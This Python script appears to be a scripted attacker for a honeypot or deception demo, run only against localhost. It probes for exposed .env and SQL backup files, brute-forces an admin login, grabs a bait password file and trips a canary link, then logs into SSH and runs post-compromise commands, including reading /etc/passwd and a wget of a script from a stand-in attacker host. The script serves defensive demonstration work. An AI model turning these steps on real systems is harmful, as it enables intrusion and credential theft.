"""Scripted demo attacker. Talks ONLY to 127.0.0.1 (your own machine). Use for the live demo.

  python attacker_demo/attack.py            # narrated, with pauses
  python attacker_demo/attack.py --fast     # no pauses
  python attacker_demo/attack.py --skip-ssh # web only (no asyncssh needed)
"""
import argparse
import asyncio
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

WEB = "http://127.0.0.1:8081"
SSH_PORT = 2222
import secrets
UA = "Mozilla/5.0 (X11; Kali) attack-demo/1.0 run-" + secrets.token_hex(2)  # new session each run


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def say(msg):
    print(f"\n[ATTACKER] {msg}", flush=True)


def http(path, ip, data=None, url=None):
    req = urllib.request.Request(url or WEB + path, data=data,
                                 headers={"User-Agent": UA, "X-Forwarded-For": ip})
    opener = urllib.request.build_opener(NoRedirect)
    try:
        r = opener.open(req, timeout=8)
        return r.status, r.read().decode(errors="replace"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), e.headers


def pause(args, s=1.2):
    if not args.fast:
        time.sleep(s)


def web_phase(args):
    ip = args.ip
    say(f"Recon: looking at the target web server (simulated source IP {ip})")
    s, _, h = http("/", ip); print(f"  GET /  -> {s}  Server: {h.get('Server')}"); pause(args)
    for p in ("/.env", "/backup.sql"):
        s, body, _ = http(p, ip); print(f"  GET {p} -> {s}  ({len(body)} bytes leaked!)"); pause(args, .6)

    say("Brute-forcing the admin login")
    guesses = [("root", "toor"), ("administrator", "admin"), ("test", "test"), ("admin", "admin123")]
    ok = False
    for u, p in guesses:
        s, _, _ = http("/login", ip, data=urllib.parse.urlencode({"username": u, "password": p}).encode())
        ok = s in (301, 302, 303)
        print(f"  {u}:{p} -> {'SUCCESS (redirect)' if ok else 'failed ' + str(s)}"); pause(args, .5)
        if ok:
            break
    if not ok:
        sys.exit("login never succeeded; is the stack up?")

    say("Inside the admin portal. Grabbing the juicy credentials backup")
    http("/admin", ip); pause(args, .6)
    s, body, _ = http("/download/passwords_backup.txt", ip)
    print(f"  downloaded passwords_backup.txt ({len(body)} bytes)"); pause(args)
    m = re.search(r"https?://\S+/c/\S+", body)
    if m:
        say("Bait file mentions an 'internal wiki' link. Opening it...")
        s, _, _ = http("", ip, url=m.group(0).replace("127.0.0.1:8000", "127.0.0.1:8000"))
        print(f"  GET {m.group(0)} -> {s}  (this just tripped the canary)")
    pause(args)


async def ssh_phase(args):
    try:
        import asyncssh
    except ImportError:
        print("\n[ATTACKER] asyncssh not installed (pip install asyncssh); skipping SSH phase.")
        return
    passwords = iter(["admin", "Winter2024!"])

    class C(asyncssh.SSHClient):
        def password_auth_requested(self):
            return next(passwords, None)

    say("Pivoting to SSH on port 2222")
    try:
        conn = await asyncssh.connect("127.0.0.1", SSH_PORT, username="admin", client_factory=C,
                                      known_hosts=None, public_key_auth=False)
    except Exception as e:
        print("  SSH connect failed:", e)
        return
    async with conn:
        for cmd in ["whoami", "uname -a", "ls -la", "cat /etc/passwd", "cat passwords_backup.txt",
                    "wget http://evil.example/x.sh", "chmod +x x.sh", "sudo -l"]:
            say(f"$ {cmd}")
            r = await conn.run(cmd, check=False)
            print("  " + (r.stdout or "").strip().replace("\n", "\n  ")[:400]); pause(args, .7)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fast", action="store_true")
    ap.add_argument("--skip-ssh", action="store_true")
    ap.add_argument("--ip", default="203.0.113.77", help="simulated attacker IP (TEST-NET-3 doc range)")
    args = ap.parse_args()
    web_phase(args)
    if not args.skip_ssh:
        asyncio.run(ssh_phase(args))
    say("Done. Check the defender console at http://127.0.0.1:8000")


if __name__ == "__main__":
    main()
